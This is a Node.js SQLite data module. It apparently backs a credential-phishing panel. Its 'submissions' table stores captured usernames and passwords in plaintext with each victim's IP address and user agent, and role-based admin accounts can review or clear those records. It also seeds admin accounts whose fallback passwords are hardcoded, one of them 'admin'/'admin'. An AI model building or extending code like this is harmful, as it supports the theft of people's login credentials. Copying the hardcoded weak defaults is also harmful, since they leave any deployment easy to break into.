require('dotenv').config();

const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const bcrypt = require('bcryptjs');

const DB_PATH = path.join(__dirname, 'database.sqlite');

const db = new sqlite3.Database(DB_PATH, (err) => {
    if (err) {
        console.error('Failed to connect to SQLite database:', err.message);
    } else {
        console.log('Connected to SQLite database at:', DB_PATH);
    }
});

// Initialize database schema
db.serialize(() => {
    // Submissions table
    db.run(`
        CREATE TABLE IF NOT EXISTS submissions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            password TEXT NOT NULL,
            ip_address TEXT,
            user_agent TEXT,
            created_at DATETIME DEFAULT (datetime('now', 'localtime'))
        )
    `, (err) => {
        if (err) {
            console.error('Error creating submissions table:', err.message);
        } else {
            console.log('Submissions table is ready.');
        }
    });

    // Members table (RBAC)
    db.run(`
        CREATE TABLE IF NOT EXISTS members (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL,
            username TEXT NOT NULL UNIQUE,
            password_hash TEXT NOT NULL,
            role TEXT NOT NULL DEFAULT 'viewer',
            created_by TEXT DEFAULT 'system',
            is_active INTEGER DEFAULT 1,
            created_at DATETIME DEFAULT (datetime('now', 'localtime'))
        )
    `, (err) => {
        if (err) {
            console.error('Error creating members table:', err.message);
        } else {
            console.log('Members table is ready.');
            seedDefaultMembers();
        }
    });
});

/**
 * Seed default Developer + legacy Admin accounts using .env passwords
 */
async function seedDefaultMembers() {
    const defaults = [
        { name: 'Developer',      username: 'developer', password: process.env.DEVELOPER_PASSWORD || 'Dev#Grand2025', role: 'developer' },
        { name: 'Admin Member 1', username: 'admin1',    password: process.env.ADMIN1_PASSWORD    || 'Grand#Admin1',  role: 'admin' },
        { name: 'Admin Member 2', username: 'admin2',    password: process.env.ADMIN2_PASSWORD    || 'Grand#Admin2',  role: 'admin' },
        { name: 'Admin Member 3', username: 'admin3',    password: process.env.ADMIN3_PASSWORD    || 'Grand#Admin3',  role: 'admin' },
        { name: 'Admin',          username: 'admin',     password: process.env.ADMIN_PASSWORD     || 'admin',         role: 'admin' },
    ];

    for (const m of defaults) {
        db.get(`SELECT id FROM members WHERE username = ?`, [m.username], async (err, row) => {
            if (!row) {
                const hash = await bcrypt.hash(m.password, 10);
                db.run(
                    `INSERT INTO members (name, username, password_hash, role, created_by) VALUES (?, ?, ?, ?, 'system')`,
                    [m.name, m.username, hash, m.role],
                    (insertErr) => {
                        if (!insertErr) console.log(`[SEED] Created member: ${m.username} (${m.role})`);
                    }
                );
            }
        });
    }
}

// ─── Submission Functions ─────────────────────────────────────────────────────

function addSubmission({ username, password, ipAddress, userAgent }) {
    return new Promise((resolve, reject) => {
        const query = `INSERT INTO submissions (username, password, ip_address, user_agent) VALUES (?, ?, ?, ?)`;
        db.run(query, [username, password, ipAddress, userAgent], function (err) {
            if (err) return reject(err);
            resolve({ id: this.lastID, username, password, ip_address: ipAddress, user_agent: userAgent });
        });
    });
}

function getAllSubmissions() {
    return new Promise((resolve, reject) => {
        db.all(`SELECT * FROM submissions ORDER BY id DESC`, [], (err, rows) => {
            if (err) return reject(err);
            resolve(rows);
        });
    });
}

function deleteSubmission(id) {
    return new Promise((resolve, reject) => {
        db.run(`DELETE FROM submissions WHERE id = ?`, [id], function (err) {
            if (err) return reject(err);
            resolve({ deleted: this.changes > 0 });
        });
    });
}

function clearAllSubmissions() {
    return new Promise((resolve, reject) => {
        db.run(`DELETE FROM submissions`, [], function (err) {
            if (err) return reject(err);
            resolve({ clearedCount: this.changes });
        });
    });
}

// ─── Member (RBAC) Functions ──────────────────────────────────────────────────

function getMemberByUsername(username) {
    return new Promise((resolve, reject) => {
        db.get(
            `SELECT * FROM members WHERE username = ? AND is_active = 1`,
            [username.trim().toLowerCase()],
            (err, row) => {
                if (err) return reject(err);
                resolve(row || null);
            }
        );
    });
}

function getAllMembers() {
    return new Promise((resolve, reject) => {
        db.all(
            `SELECT id, name, username, role, created_by, is_active, created_at FROM members ORDER BY id ASC`,
            [],
            (err, rows) => {
                if (err) return reject(err);
                resolve(rows);
            }
        );
    });
}

async function addMember({ name, username, password, role, createdBy }) {
    const hash = await bcrypt.hash(password, 10);
    return new Promise((resolve, reject) => {
        db.run(
            `INSERT INTO members (name, username, password_hash, role, created_by) VALUES (?, ?, ?, ?, ?)`,
            [name.trim(), username.trim().toLowerCase(), hash, role, createdBy],
            function (err) {
                if (err) return reject(err);
                resolve({ id: this.lastID, name, username: username.trim().toLowerCase(), role });
            }
        );
    });
}

async function updateMember({ id, name, role, password }) {
    if (password) {
        const hash = await bcrypt.hash(password, 10);
        return new Promise((resolve, reject) => {
            db.run(
                `UPDATE members SET name = ?, role = ?, password_hash = ? WHERE id = ?`,
                [name, role, hash, id],
                function (err) {
                    if (err) return reject(err);
                    resolve({ updated: this.changes > 0 });
                }
            );
        });
    } else {
        return new Promise((resolve, reject) => {
            db.run(
                `UPDATE members SET name = ?, role = ? WHERE id = ?`,
                [name, role, id],
                function (err) {
                    if (err) return reject(err);
                    resolve({ updated: this.changes > 0 });
                }
            );
        });
    }
}

function deleteMember(id) {
    return new Promise((resolve, reject) => {
        db.run(`DELETE FROM members WHERE id = ?`, [id], function (err) {
            if (err) return reject(err);
            resolve({ deleted: this.changes > 0 });
        });
    });
}

module.exports = {
    db,
    addSubmission,
    getAllSubmissions,
    deleteSubmission,
    clearAllSubmissions,
    getMemberByUsername,
    getAllMembers,
    addMember,
    updateMember,
    deleteMember
};
